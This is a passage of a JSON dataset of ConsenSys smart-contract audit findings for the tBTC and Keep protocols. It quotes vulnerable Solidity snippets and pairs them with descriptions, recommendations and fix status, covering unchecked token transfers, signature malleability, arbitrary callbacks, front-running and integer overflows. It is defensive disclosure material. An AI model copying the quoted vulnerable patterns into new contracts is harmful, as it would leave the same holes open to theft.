      "content": "#### Resolution\n\n\n\nAddressed with <https://github.com/keep-network/keep-core/issues/1407> and <https://github.com/keep-network/keep-tecdsa/issues/272>.\n\n\n#### Description\n\n\nUse `SafeERC20` features to interact with potentially broken tokens used in the system. E.g. `TokenGrant.receiveApproval()` is using `safeTransferFrom` while other contracts aren’t.\n\n\n#### Examples\n\n\n* `TokenGrant.receiveApproval` using `safeTransferFrom`\n\n\n**keep-core/contracts/solidity/contracts/TokenGrant.sol:L200-L200**\n\n\n\n```\ntoken.safeTransferFrom(\\_from, address(this), \\_amount);\n\n```\n* `TokenStaking.receiveApproval` not using `safeTransferFrom` while `safeTransfer` is being used.\n\n\n**keep-core/contracts/solidity/contracts/TokenStaking.sol:L75-L75**\n\n\n\n```\ntoken.transferFrom(\\_from, address(this), \\_value);\n\n```\n**keep-core/contracts/solidity/contracts/TokenStaking.sol:L103-L103**\n\n\n\n```\ntoken.safeTransfer(owner, amount);\n\n```\n**keep-core/contracts/solidity/contracts/TokenStaking.sol:L193-L193**\n\n\n\n```\ntoken.transfer(tattletale, tattletaleReward);\n\n```\n* `distributeERC20ToMembers` not using `safeTransferFrom`\n\n\n**keep-tecdsa/solidity/contracts/BondedECDSAKeep.sol:L459-L463**\n\n\n\n```\ntoken.transferFrom(\n    msg.sender,\n    tokenStaking.magpieOf(members[i]),\n    dividend\n);\n\n```\n#### Recommendation\n\n\nConsistently use `SafeERC20` to support potentially broken tokens external to the system.",
      "summary": "\nThis bug report is about the use of the SafeERC20 features to interact with potentially broken tokens used in the system. The bug was addressed by making changes to two Github issues, <https://github.com/keep-network/keep-core/issues/1407> and <https://github.com/keep-network/keep-tecdsa/issues/272>.\n\nExamples of the bug include `TokenGrant.receiveApproval` using `safeTransferFrom`, `TokenStaking.receiveApproval` not using `safeTransferFrom` while `safeTransfer` is being used, and `distributeERC20ToMembers` not using `safeTransferFrom`.\n\nThe recommendation is to consistently use SafeERC20 to support potentially broken tokens external to the system.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "ConsenSys",
      "protocol_name": "Thesis - tBTC and Keep",
      "source_link": "https://consensys.net/diligence/audits/2020/02/thesis-tbtc-and-keep/",
      "github_link": "",
      "tags": [],
      "finders": [
        "Martin Ortner",
        "Alexander Wade"
      ]
    },
    {
      "id": "13780",
      "title": "tbtc - Disallow signatures with high-s values in DepositRedemption.provideRedemptionSignature ✓ Addressed",
      "impact": "MEDIUM",
      "content": "#### Resolution\n\n\n\nIssue addressed in [keep-network/tbtc#518](https://github.com/keep-network/tbtc/pull/518)\n\n\n#### Description\n\n\n`DepositRedemption.provideRedemptionSignature` is used by signers to publish a signature that can be used to redeem a deposit on Bitcoin. The function accepts a signature s value in the upper half of the secp256k1 curve:\n\n\n**tbtc/implementation/contracts/deposit/DepositRedemption.sol:L183-L202**\n\n\n\n```\nfunction provideRedemptionSignature(\n    DepositUtils.Deposit storage \\_d,\n    uint8 \\_v,\n    bytes32 \\_r,\n    bytes32 \\_s\n) public {\n    require(\\_d.inAwaitingWithdrawalSignature(), \"Not currently awaiting a signature\");\n\n    // If we're outside of the signature window, we COULD punish signers here\n    // Instead, we consider this a no-harm-no-foul situation.\n    // The signers have not stolen funds. Most likely they've just inconvenienced someone\n\n    // The signature must be valid on the pubkey\n    require(\n        \\_d.signerPubkey().checkSig(\n            \\_d.lastRequestedDigest,\n            \\_v, \\_r, \\_s\n        ),\n        \"Invalid signature\"\n    );\n\n```\nAlthough `ecrecover` accepts signatures with these s values, they are no longer used in Bitcoin. As such, the signature will appear to be valid to the Ethereum smart contract, but will likely not be accepted on Bitcoin. If no users watching malleate the signature, the redemption process will likely enter a fee increase loop, incurring a cost on the deposit owner.\n\n\n#### Recommendation\n\n\nEnsure the passed-in s value is restricted to the lower half of the secp256k1 curve, as done in `BondedECDSAKeep`:\n\n\n**keep-tecdsa/solidity/contracts/BondedECDSAKeep.sol:L333-L340**\n\n\n\n```\n// Validate `s` value for a malleability concern described in EIP-2.\n// Only signatures with `s` value in the lower half of the secp256k1\n// curve's order are considered valid.\nrequire(\n    uint256(\\_s) <=\n        0x7FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF5D576E7357A4501DDFE92F46681B20A0,\n    \"Malleable signature - s should be in the low half of secp256k1 curve's order\"\n);\n\n```",
      "summary": "\nThis bug report is about a function called `DepositRedemption.provideRedemptionSignature` which is used by signers to publish a signature that can be used to redeem a deposit on Bitcoin. It was found that although `ecrecover` accepts signatures with these s values, they are no longer used in Bitcoin. This could lead to the redemption process entering a fee increase loop, incurring a cost on the deposit owner. \n\nThe recommendation is to ensure the passed-in s value is restricted to the lower half of the secp256k1 curve, as done in `BondedECDSAKeep`. This will prevent the signature from appearing to be valid to the Ethereum smart contract, but not accepted on Bitcoin.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "ConsenSys",
      "protocol_name": "Thesis - tBTC and Keep",
      "source_link": "https://consensys.net/diligence/audits/2020/02/thesis-tbtc-and-keep/",
      "github_link": "",
      "tags": [],
      "finders": [
        "Martin Ortner",
        "Alexander Wade"
      ]
    },
    {
      "id": "13779",
      "title": "keep-core - Service contract callbacks can be abused to call into other contracts ✓ Addressed",
      "impact": "MEDIUM",
      "content": "#### Resolution\n\n\n\nAddressed with [keep-network/keep-core#1532](https://github.com/keep-network/keep-core/pull/1532) by hardcoding the callback method signature and the following statement:\n\n\n\n> \n> We still allow specifying an address of the callback contract. This could be beneficial in a situations where one contract pays for a random number for another contract.\n> \n> \n> \n\n\nA subsequent change in [keep-network/keep-ecdsa#339](https://github.com/keep-network/keep-ecdsa/pull/339) updated `keep-tecdsa` to use the new, hardcoded callback function: `__beaconCallback(uint256)`.\n\n\n\n\n#### Description\n\n\n`KeepRandomBeaconServiceImplV1` allows senders to specify an arbitrary method and contract that will receive a callback once the beacon generates a relay entry:\n\n\n**keep-core/contracts/solidity/contracts/KeepRandomBeaconServiceImplV1.sol:L228-L245**\n\n\n\n```\n/\\*\\*\n \\* @dev Creates a request to generate a new relay entry, which will include\n \\* a random number (by signing the previous entry's random number).\n \\* @param callbackContract Callback contract address. Callback is called once a new relay entry has been generated.\n \\* @param callbackMethod Callback contract method signature. String representation of your method with a single\n \\* uint256 input parameter i.e. \"relayEntryCallback(uint256)\".\n \\* @param callbackGas Gas required for the callback.\n \\* The customer needs to ensure they provide a sufficient callback gas\n \\* to cover the gas fee of executing the callback. Any surplus is returned\n \\* to the customer. If the callback gas amount turns to be not enough to\n \\* execute the callback, callback execution is skipped.\n \\* @return An uint256 representing uniquely generated relay request ID. It is also returned as part of the event.\n \\*/\nfunction requestRelayEntry(\n    address callbackContract,\n    string memory callbackMethod,\n    uint256 callbackGas\n) public nonReentrant payable returns (uint256) {\n\n```\nOnce an operator contract receives the relay entry, it calls `executeCallback`:\n\n\n**keep-core/contracts/solidity/contracts/KeepRandomBeaconServiceImplV1.sol:L314-L335**\n\n\n\n```\n/\\*\\*\n \\* @dev Executes customer specified callback for the relay entry request.\n \\* @param requestId Request id tracked internally by this contract.\n \\* @param entry The generated random number.\n \\* @return Address to receive callback surplus.\n \\*/\nfunction executeCallback(uint256 requestId, uint256 entry) public returns (address payable surplusRecipient) {\n    require(\n        \\_operatorContracts.contains(msg.sender),\n        \"Only authorized operator contract can call execute callback.\"\n    );\n\n    require(\n        \\_callbacks[requestId].callbackContract != address(0),\n        \"Callback contract not found\"\n    );\n\n    \\_callbacks[requestId].callbackContract.call(abi.encodeWithSignature(\\_callbacks[requestId].callbackMethod, entry));\n\n    surplusRecipient = \\_callbacks[requestId].surplusRecipient;\n    delete \\_callbacks[requestId];\n}\n\n```\nArbitrary callbacks can be used to force the service contract to execute many functions within the keep contract system. Currently, the `KeepRandomBeaconOperator` includes an `onlyServiceContract` modifier:\n\n\n**keep-core/contracts/solidity/contracts/KeepRandomBeaconOperator.sol:L150-L159**\n\n\n\n```\n/\\*\\*\n \\* @dev Checks if sender is authorized.\n \\*/\nmodifier onlyServiceContract() {\n    require(\n        serviceContracts.contains(msg.sender),\n        \"Caller is not an authorized contract\"\n    );\n    \\_;\n}\n\n```\nThe functions it protects cannot be targeted by the aforementioned service contract callbacks due to Solidity’s `CALLDATASIZE` checking. However, the presence of the modifier suggests that the service contract is expected to be a permissioned actor within some contracts.\n\n\n#### Recommendation\n\n\n1. Stick to a constant callback method signature, rather than allowing users to submit an arbitrary string. An example is `__beaconCallback__(uint256)`.\n2. Consider disallowing arbitrary callback destinations. Instead, rely on contracts making requests directly, and default the callback destination to `msg.sender`. Ensure the sender is not an EOA.",
      "summary": "\nA bug was discovered in the `KeepRandomBeaconServiceImplV1` contract, which allowed users to specify an arbitrary method and contract to receive a callback once the beacon generates a relay entry. This could be used to force the service contract to execute many functions within the keep contract system. To fix this, a change was implemented in [keep-network/keep-core#1532](https://github.com/keep-network/keep-core/pull/1532) by hardcoding the callback method signature and allowing users to specify an address of the callback contract. Additionally, [keep-network/keep-ecdsa#339](https://github.com/keep-network/keep-ecdsa/pull/339) was updated to use the new, hardcoded callback function: `__beaconCallback(uint256)`.\n\nThe bug report recommends sticking to a constant callback method signature, rather than allowing users to submit an arbitrary string. Additionally, it suggests disallowing arbitrary callback destinations, relying instead on contracts making requests directly and defaulting the callback destination to `msg.sender`. The sender should not be an EOA.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "ConsenSys",
      "protocol_name": "Thesis - tBTC and Keep",
      "source_link": "https://consensys.net/diligence/audits/2020/02/thesis-tbtc-and-keep/",
      "github_link": "",
      "tags": [],
      "finders": [
        "Martin Ortner",
        "Alexander Wade"
      ]
    },
    {
      "id": "13778",
      "title": "DKGResultVerification.verify unsafe packing in signed data ✓ Addressed",
      "impact": "MEDIUM",
      "content": "#### Resolution\n\n\n\nAddressed with [keep-network/keep-core#1525](https://github.com/keep-network/keep-core/pull/1525) by adding additional checks for `groupPubKey` size, the number of signatures provided and the length of the provided misbehaved group indices. No salt was added to separate the fields.\n\n\n#### Description\n\n\n`DKGResultVerification.verify` allows the sender to arbitrarily move bytes between `groupPubKey` and `misbehaved`:\n\n\n**keep-core/contracts/solidity/contracts/libraries/operator/DKGResultVerification.sol:L80**\n\n\n\n```\nbytes32 resultHash = keccak256(abi.encodePacked(groupPubKey, misbehaved));\n\n```\n#### Recommendation\n\n\nValidate the expected length of both and add a salt between the two.",
      "summary": "\nA bug was reported in the keep-network/keep-core#1525 repository where the `DKGResultVerification.verify` allows the sender to move bytes between `groupPubKey` and `misbehaved`. This could lead to incorrect or malicious verification results. To address this issue, additional checks were added for `groupPubKey` size, the number of signatures provided and the length of the provided misbehaved group indices. No salt was added to separate the fields.\n\nIt is recommended that the expected length of both `groupPubKey` and `misbehaved` should be validated and a salt should be added between the two to provide extra security.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "ConsenSys",
      "protocol_name": "Thesis - tBTC and Keep",
      "source_link": "https://consensys.net/diligence/audits/2020/02/thesis-tbtc-and-keep/",
      "github_link": "",
      "tags": [],
      "finders": [
        "Martin Ortner",
        "Alexander Wade"
      ]
    },
    {
      "id": "13777",
      "title": "tbtc - Anyone can emit log events due to missing access control ✓ Addressed",
      "impact": "HIGH",
      "content": "#### Resolution\n\n\n\nAddressed with <https://github.com/keep-network/tbtc/issues/477,> [keep-network/tbtc#467](https://github.com/keep-network/tbtc/pull/467) and [keep-network/tbtc#537](https://github.com/keep-network/tbtc/pull/537) by restricting log calls to known `TBTCDepositToken`. `tbtcDepositToken` was moved to `DepositLog` which is not ideal.\n\n\n#### Description\n\n\nAccess control for `DepositLog` is not implemented. `DepositLog` is inherited by `TBTCSystem` and its functionality is usually consumed by `Deposit` contracts to emit log events on `TBTCSystem`. Due to the missing access control, anyone can emit log events on `TBTCSystem`. Users, client-software or other components that rely on these events might be tricked into performing actions that were not authorized by the system.\n\n\n#### Examples\n\n\n**tbtc/implementation/contracts/DepositLog.sol:L95-L99**\n\n\n\n```\nfunction approvedToLog(address \\_caller) public pure returns (bool) {\n    /\\* TODO: auth via system \\*/\n    \\_caller;\n    return true;\n}\n\n```\n#### Recommendation\n\n\nLog events are typically initiated by the Deposit contract. Make sure only Deposit contracts deployed by an approved factory can emit logs on TBTCSystem.",
      "summary": "\nThis bug report is about the access control for the DepositLog. DepositLog is inherited by TBTCSystem and its functionality is usually consumed by Deposit contracts to emit log events on TBTCSystem. However, due to the missing access control, anyone can emit log events on TBTCSystem. This means that users, client-software or other components that rely on these events might be tricked into performing actions that were not authorized by the system. To address this issue, the log calls were restricted to known TBTCDepositToken and tbtcDepositToken was moved to DepositLog. Additionally, it is recommended that only Deposit contracts deployed by an approved factory can emit logs on TBTCSystem.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "ConsenSys",
      "protocol_name": "Thesis - tBTC and Keep",
      "source_link": "https://consensys.net/diligence/audits/2020/02/thesis-tbtc-and-keep/",
      "github_link": "",
      "tags": [],
      "finders": [
        "Martin Ortner",
        "Alexander Wade"
      ]
    },
    {
      "id": "13776",
      "title": "tbtc - various deposit state transitions can be front-run (e.g. fraud proofs, timeouts)  Won't Fix",
      "impact": "HIGH",
      "content": "#### Resolution\n\n\n\nAddressed with the discussion at <https://github.com/keep-network/tbtc/issues/498>. It is accepted that a malicious entity may be able to front-run certain fraud proofs as long as fraud is being called out. It is also accepted that calls to certain timeouts may be front-run which could lead to a scenario where the client implementation is always front-run by a malicious actor.\n\n\nAdditionally, the client provided the following statement:\n\n\n\n> \n> In general, we are comfortable with front-runnable interactions that ensure system integrity, as long as such front-running does not remove the original incentive of the submitter. We believe remaining front-runnable interactions have clear benefits to system actors, such that even if they are front-run, they have reason to submit the transaction.\n> \n> \n> \n\n\n\n\n#### Description\n\n\nAn entity that can provide proof for fraudulent ECDSA signatures or SPV proofs in the liquidation flow is rewarded with part of the deposit contract ETH value.\n\n\n\n> \n> [Specification: Liquidation](http://docs.keep.network/tbtc/#liquidation)\n> Any signer bond left over after the deposit owner is compensated is distributed to the account responsible for reporting the misbehavior (for fraud) or between the signers and the account that triggered liquidation (for collateralization issues).\n> \n> \n> \n\n\nHowever, the methods under which proof is provided are not protected from front-running allowing anyone to observe transactions to `provideECDSAFraudProof`/ `provideSPVFraudProof` and submit the same proofs with providing a higher gas value.\n\n\nPlease note that a similar issue exists for timeout states providing rewards for calling them out (i.e. they set the `liquidationInitiator` address).\n\n\n#### Examples\n\n\n* `provideECDSAFraudProof` verifies the fraudulent proof\n\n\n`r,s,v,signedDigest` appear to be the fraudulent signature. `_preimage` is the correct value.\n\n\n**tbtc/implementation/contracts/deposit/DepositLiquidation.sol:L117-L137**\n\n\n\n```\n/// @param \\_preimage The sha256 preimage of the digest\nfunction provideECDSAFraudProof(\n    DepositUtils.Deposit storage \\_d,\n    uint8 \\_v,\n    bytes32 \\_r,\n    bytes32 \\_s,\n    bytes32 \\_signedDigest,\n    bytes memory \\_preimage\n) public {\n    require(\n        !\\_d.inFunding() && !\\_d.inFundingFailure(),\n        \"Use provideFundingECDSAFraudProof instead\"\n    );\n    require(\n        !\\_d.inSignerLiquidation(),\n        \"Signer liquidation already in progress\"\n    );\n    require(!\\_d.inEndState(), \"Contract has halted\");\n    require(submitSignatureFraud(\\_d, \\_v, \\_r, \\_s, \\_signedDigest, \\_preimage), \"Signature is not fraud\");\n    startSignerFraudLiquidation(\\_d);\n}\n\n```\n* `startSignerFraudLiquidation` sets the address that provides the proof as the beneficiary\n\n\n**tbtc/implementation/contracts/deposit/DepositFunding.sol:L153-L179**\n\n\n\n```\nfunction provideFundingECDSAFraudProof(\n    DepositUtils.Deposit storage \\_d,\n    uint8 \\_v,\n    bytes32 \\_r,\n    bytes32 \\_s,\n    bytes32 \\_signedDigest,\n    bytes memory \\_preimage\n) public {\n    require(\n        \\_d.inAwaitingBTCFundingProof(),\n        \"Signer fraud during funding flow only available while awaiting funding\"\n    );\n\n    bool \\_isFraud = \\_d.submitSignatureFraud(\\_v, \\_r, \\_s, \\_signedDigest, \\_preimage);\n    require(\\_isFraud, \"Signature is not fraudulent\");\n    \\_d.logFraudDuringSetup();\n\n    // If the funding timeout has elapsed, punish the funder too!\n    if (block.timestamp > \\_d.fundingProofTimerStart + TBTCConstants.getFundingTimeout()) {\n        address(0).transfer(address(this).balance);  // Burn it all down (fire emoji)\n        \\_d.setFailedSetup();\n    } else {\n        /\\* NB: This is reuse of the variable \\*/\n        \\_d.fundingProofTimerStart = block.timestamp;\n        \\_d.setFraudAwaitingBTCFundingProof();\n    }\n}\n\n```\n* `purchaseSignerBondsAtAuction` pays out the funds\n\n\n**tbtc/implementation/contracts/deposit/DepositLiquidation.sol:L260-L276**\n\n\n\n```\n    uint256 contractEthBalance = address(this).balance;\n    address payable initiator = \\_d.liquidationInitiator;\n\n    if (initiator == address(0)){\n        initiator = address(0xdead);\n    }\n    if (contractEthBalance > 1) {\n        if (\\_wasFraud) {\n            initiator.transfer(contractEthBalance);\n        } else {\n            // There will always be a liquidation initiator.\n            uint256 split = contractEthBalance.div(2);\n            \\_d.pushFundsToKeepGroup(split);\n            initiator.transfer(split);\n        }\n    }\n}\n\n```\n#### Recommendation\n\n\nFor fraud proofs, it should be required that the reporter uses a commit/reveal scheme to lock in a proof in one block, and reveal the details in another.",
      "summary": "\nA bug report has been reported that malicious entities may be able to front-run certain fraud proofs, calls to certain timeouts, or other interactions that offer rewards for reporting. If a malicious entity is able to observe transactions and submit the same proofs with a higher gas value, they can take the rewards that should have gone to the original submitter. An example of this is when a fraudulent ECDSA signature or SPV proof is provided, the entity that provides the proof is rewarded with part of the deposit contract ETH value. \n\nCurrently, the methods under which proof is provided are not protected from front-running. To address this, it is recommended that a commit/reveal scheme be used, where the reporter locks in a proof in one block and reveals the details in another. This would prevent malicious entities from taking the rewards that should have gone to the original submitter.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "ConsenSys",
      "protocol_name": "Thesis - tBTC and Keep",
      "source_link": "https://consensys.net/diligence/audits/2020/02/thesis-tbtc-and-keep/",
      "github_link": "",
      "tags": [],
      "finders": [
        "Martin Ortner",
        "Alexander Wade"
      ]
    },
    {
      "id": "13775",
      "title": "tbtc - Unreachable state LIQUIDATION_IN_PROGRESS ✓ Addressed",
      "impact": "HIGH",
      "content": "#### Resolution\n\n\n\nAddressed with <https://github.com/keep-network/tbtc/issues/497> with commits from [keep-network/tbtc#517](https://github.com/keep-network/tbtc/pull/517) changing all non-fraud transitions to end up in `LIQUIDATION_IN_PROGRESS`.\n\n\n#### Description\n\n\nAccording to the specification ([overview](http://docs.keep.network/tbtc/#_overview_6), [states](http://docs.keep.network/tbtc/#_states_3), version 2020-02-06), a deposit can be in one of two **liquidation\\_in\\_progress** states.\n\n\n##### LIQUIDATION\\_IN\\_PROGRESS\n\n\n\n> \n> LIQUIDATION\\_IN\\_PROGRESS\n> Liquidation due to undercollateralization or an abort has started\n> Automatic (on-chain) liquidation was unsuccessful\n> \n> \n> \n\n\n##### FRAUD\\_LIQUIDATION\\_IN\\_PROGRESS\n\n\n\n> \n> FRAUD\\_LIQUIDATION\\_IN\\_PROGRESS\n> Liquidation due to fraud has started\n> Automatic (on-chain) liquidation was unsuccessful\n> \n> \n> \n\n\nHowever, `LIQUIDATION_IN_PROGRESS` is unreachable and instead, `FRAUD_LIQUIDATION_IN_PROGRESS` is always called. This means that all non-fraud state transitions end up in the fraud liquidation path and will perform actions as if fraud was detected even though it might be caused by an undercollateralized notification or courtesy timeout.\n\n\n#### Examples\n\n\n* `startSignerAbortLiquidation` transitions to `FRAUD_LIQUIDATION_IN_PROGRESS` on non-fraud events `notifyUndercollateralizedLiquidation` and `notifyCourtesyTimeout`\n\n\n**tbtc/implementation/contracts/deposit/DepositLiquidation.sol:L96-L108**\n\n\n\n```\n/// @notice Starts signer liquidation due to abort or undercollateralization\n/// @dev We first attempt to liquidate on chain, then by auction\n/// @param \\_d deposit storage pointer\nfunction startSignerAbortLiquidation(DepositUtils.Deposit storage \\_d) internal {\n    \\_d.logStartedLiquidation(false);\n    // Reclaim used state for gas savings\n    \\_d.redemptionTeardown();\n    \\_d.seizeSignerBonds();\n\n    \\_d.liquidationInitiated = block.timestamp;  // Store the timestamp for auction\n    \\_d.liquidationInitiator = msg.sender;\n    \\_d.setFraudLiquidationInProgress();\n}\n\n```\n#### Recommendation\n\n\nVerify state transitions and either remove `LIQUIDATION_IN_PROGRESS` if it is redundant or fix the state transitions for non-fraud liquidations.\n\n\nNote that Deposit states can be simplified by removing redundant states by setting a flag (e.g. fraudLiquidation) in the deposit instead of adding a state to track the fraud liquidation path.\n\n\nAccording to the specification, we assume the following state transitions are desired:\n\n\n`LIQUIDATION_IN_PROGRESS`\n\n\n\n> \n> In case of liquidation due to undercollateralization or abort, the remaining bond value is split 50-50 between the account which triggered the liquidation and the signers.\n> \n> \n> \n\n\n`FRAUD_LIQUIDATION_IN_PROGRESS`\n\n\n\n> \n> In case of liquidation due to fraud, the remaining bond value in full goes to the account which triggered the liquidation by proving fraud.\n> \n> \n>",
      "summary": "\nThis bug report is about an issue with the tBTC protocol, which is a tokenized version of Bitcoin on the Ethereum blockchain. According to the specification, a deposit can be in one of two liquidation in progress states, but the LIQUIDATION_IN_PROGRESS state is unreachable and instead, FRAUD_LIQUIDATION_IN_PROGRESS is always called. This means that all non-fraud state transitions end up in the fraud liquidation path and will perform actions as if fraud was detected even though it might be caused by an undercollateralized notification or courtesy timeout.\n\nTo fix this, the state transitions were addressed with a commit from keep-network/tbtc#517, changing all non-fraud transitions to end up in LIQUIDATION_IN_PROGRESS. The recommendation is to verify state transitions and either remove LIQUIDATION_IN_PROGRESS if it is redundant or fix the state transitions for non-fraud liquidations. Additionally, the Deposit states can be simplified by removing redundant states by setting a flag (e.g. fraudLiquidation) in the deposit instead of adding a state to track the fraud liquidation path.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "ConsenSys",
      "protocol_name": "Thesis - tBTC and Keep",
      "source_link": "https://consensys.net/diligence/audits/2020/02/thesis-tbtc-and-keep/",
      "github_link": "",
      "tags": [],
      "finders": [
        "Martin Ortner",
        "Alexander Wade"
      ]
    },
    {
      "id": "13774",
      "title": "bitcoin-spv - multiple integer under-/overflows ✓ Addressed",
      "impact": "HIGH",
      "content": "#### Resolution\n\n\n\nThis was partially addressed in <https://github.com/summa-tx/bitcoin-spv/pull/118,> <https://github.com/summa-tx/bitcoin-spv/pull/119,> and [summa-tx/bitcoin-spv#122](https://github.com/summa-tx/bitcoin-spv/pull/122).\n\n\n* Summa opted not to fix the underflow in `extractTarget`.\n* In <https://github.com/summa-tx/bitcoin-spv/pull/118,> the `determineOutputLength` overflow was addressed by casting `_len` to a `uint256` before addition.\n* In <https://github.com/summa-tx/bitcoin-spv/pull/119,> the `extractHash` underflow was addressed by returning an empty `bytes` array if the extracted length would cause underflow. Note that an explicit error and transaction revert is favorable in these cases, in order to avoid returning unusable data to the calling function.\n* Underflow and overflow in `BytesLib` was addressed in [summa-tx/bitcoin-spv#122](https://github.com/summa-tx/bitcoin-spv/pull/122). Multiple requires were added to the mentioned functions, ensuring memory reads stayed in-bounds for each array. A later change in [summa-tx/bitcoin-spv#128](https://github.com/summa-tx/bitcoin-spv/pull/128) added support for `slice` with a length of 0.\n\n\n\n\n#### Description\n\n\nThe bitcoin-spv library allows for multiple integer under-/overflows while processing or converting potentially untrusted or user-provided data.\n\n\n#### Examples\n\n\n* `uint8` underflow `uint256(uint8(_e - 3))`\n\n\n**Note**: `_header[75]` will throw consuming all gas if out of bounds while the majority of the library usually uses `slice(start, 1)` to handle this more gracefully.\n\n\n**bitcoin-spv/solidity/contracts/BTCUtils.sol:L483-L494**\n\n\n\n```\n/// @dev Target is a 256 bit number encoded as a 3-byte mantissa and 1 byte exponent\n/// @param \\_header The header\n/// @return The target threshold\nfunction extractTarget(bytes memory \\_header) internal pure returns (uint256) {\n    bytes memory \\_m = \\_header.slice(72, 3);\n    uint8 \\_e = uint8(\\_header[75]);\n    uint256 \\_mantissa = bytesToUint(reverseEndianness(\\_m));\n    uint \\_exponent = \\_e - 3;\n\n    return \\_mantissa \\* (256 \\*\\* \\_exponent);\n}\n\n\n```\n* `uint8` overflow `uint256(uint8(_len + 8 + 1))`\n\n\n**Note**: might allow a specially crafted output to return an invalid determineOutputLength <= 9.\n\n\n**Note**: while type `VarInt` is implemented for inputs, it is not for the output length.\n\n\n**bitcoin-spv/solidity/contracts/BTCUtils.sol:L295-L304**\n\n\n\n```\n/// @dev 5 types: WPKH, WSH, PKH, SH, and OP\\_RETURN\n/// @param \\_output The output\n/// @return The length indicated by the prefix, error if invalid length\nfunction determineOutputLength(bytes memory \\_output) internal pure returns (uint256) {\n    uint8 \\_len = uint8(\\_output.slice(8, 1)[0]);\n    require(\\_len < 0xfd, \"Multi-byte VarInts not supported\");\n\n    return \\_len + 8 + 1; // 8 byte value, 1 byte for \\_len itself\n}\n\n\n```\n* `uint8` underflow `uint256(uint8(extractOutputScriptLen(_output)[0]) - 2)`\n\n\n**bitcoin-spv/solidity/contracts/BTCUtils.sol:L366-L378**\n\n\n\n```\n/// @dev Determines type by the length prefix and validates format\n/// @param \\_output The output\n/// @return The hash committed to by the pk\\_script, or null for errors\nfunction extractHash(bytes memory \\_output) internal pure returns (bytes memory) {\n    if (uint8(\\_output.slice(9, 1)[0]) == 0) {\n        uint256 \\_len = uint8(extractOutputScriptLen(\\_output)[0]) - 2;\n        // Check for maliciously formatted witness outputs\n        if (uint8(\\_output.slice(10, 1)[0]) != uint8(\\_len)) {\n            return hex\"\";\n        }\n        return \\_output.slice(11, \\_len);\n    } else {\n        bytes32 \\_tag = \\_output.keccak256Slice(8, 3);\n\n```\n* `BytesLib` input validation multiple start+length overflow\n\n\n**Note**: multiple occurrences. should check `start+length > start && bytes.length >= start+length`\n\n\n**bitcoin-spv/solidity/contracts/BytesLib.sol:L246-L248**\n\n\n\n```\nfunction slice(bytes memory \\_bytes, uint \\_start, uint \\_length) internal  pure returns (bytes memory res) {\n    require(\\_bytes.length >= (\\_start + \\_length), \"Slice out of bounds\");\n\n\n```\n* `BytesLib` input validation multiple start overflow\n\n\n**bitcoin-spv/solidity/contracts/BytesLib.sol:L280-L281**\n\n\n\n```\nfunction toUint(bytes memory \\_bytes, uint \\_start) internal  pure returns (uint256) {\n    require(\\_bytes.length >= (\\_start + 32), \"Uint conversion out of bounds.\");\n\n```\n**bitcoin-spv/solidity/contracts/BytesLib.sol:L269-L270**\n\n\n\n```\nfunction toAddress(bytes memory \\_bytes, uint \\_start) internal  pure returns (address) {\n    require(\\_bytes.length >= (\\_start + 20), \"Address conversion out of bounds.\");\n\n```\n**bitcoin-spv/solidity/contracts/BytesLib.sol:L246-L248**\n\n\n\n```\nfunction slice(bytes memory \\_bytes, uint \\_start, uint \\_length) internal  pure returns (bytes memory res) {\n    require(\\_bytes.length >= (\\_start + \\_length), \"Slice out of bounds\");\n\n\n```\n**bitcoin-spv/solidity/contracts/BytesLib.sol:L410-L412**\n\n\n\n```\nfunction keccak256Slice(bytes memory \\_bytes, uint \\_start, uint \\_length) pure internal returns (bytes32 result) {\n    require(\\_bytes.length >= (\\_start + \\_length), \"Slice out of bounds\");\n\n\n```\n#### Recommendation\n\n\nWe believe that a general-purpose parsing and verification library for bitcoin payments should be very strict when processing untrusted user input. With strict we mean, that it should rigorously validate provided input data and only proceed with the processing of the data if it is within a safe-to-use range for the method to return valid results. Relying on the caller to provide pre-validate data can be unsafe especially if the caller assumes that proper input validation is performed by the library.\n\n\nGiven the risk profile for this library, we recommend a conservative approach that balances security instead of gas efficiency without relying on certain calls or instructions to throw on invalid input.\n\n\nFor this issue specifically, we recommend proper input validation and explicit type expansion where necessary to prevent values from wrapping or processing data for arguments that are not within a safe-to-use range.",
      "summary": "\nThis bug report is about the bitcoin-spv library which allows for multiple integer under-/overflows while processing or converting potentially untrusted or user-provided data. The report provides examples of the under-/overflows in the code, such as `uint8` underflow `uint256(uint8(_e - 3))` and `uint8` overflow `uint256(uint8(_len + 8 + 1))`.\n\nTo partially address the bug, Summa made changes to the code in <https://github.com/summa-tx/bitcoin-spv/pull/118,> <https://github.com/summa-tx/bitcoin-spv/pull/119,> and [summa-tx/bitcoin-spv#122](https://github.com/summa-tx/bitcoin-spv/pull/122). In <https://github.com/summa-tx/bitcoin-spv/pull/118,> the `determineOutputLength` overflow was addressed by casting `_len` to a `uint256` before addition. In <https://github.com/summa-tx/bitcoin-spv/pull/119,> the `extractHash` underflow was addressed by returning an empty `bytes` array if the extracted length would cause underflow. Underflow and overflow in `BytesLib` was addressed in [summa-tx/bitcoin-spv#122](https://github.com/summa-tx/bitcoin-spv/pull/122).\n\nThe report recommends a conservative approach that balances security instead of gas efficiency without relying on certain calls or instructions to throw on invalid input. It suggests proper input validation and explicit type expansion to prevent values from wrapping or processing data for arguments that are not within a safe-to-use range.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "ConsenSys",
      "protocol_name": "Thesis - tBTC and Keep",
      "source_link": "https://consensys.net/diligence/audits/2020/02/thesis-tbtc-and-keep/",
      "github_link": "",
      "tags": [],
      "finders": [
        "Martin Ortner",
        "Alexander Wade"
      ]
    },
    {
      "id": "13773",
      "title": "bitcoin-spv - SPV proofs do not support transactions with larger numbers of inputs and outputs  Pending",
      "impact": "HIGH",
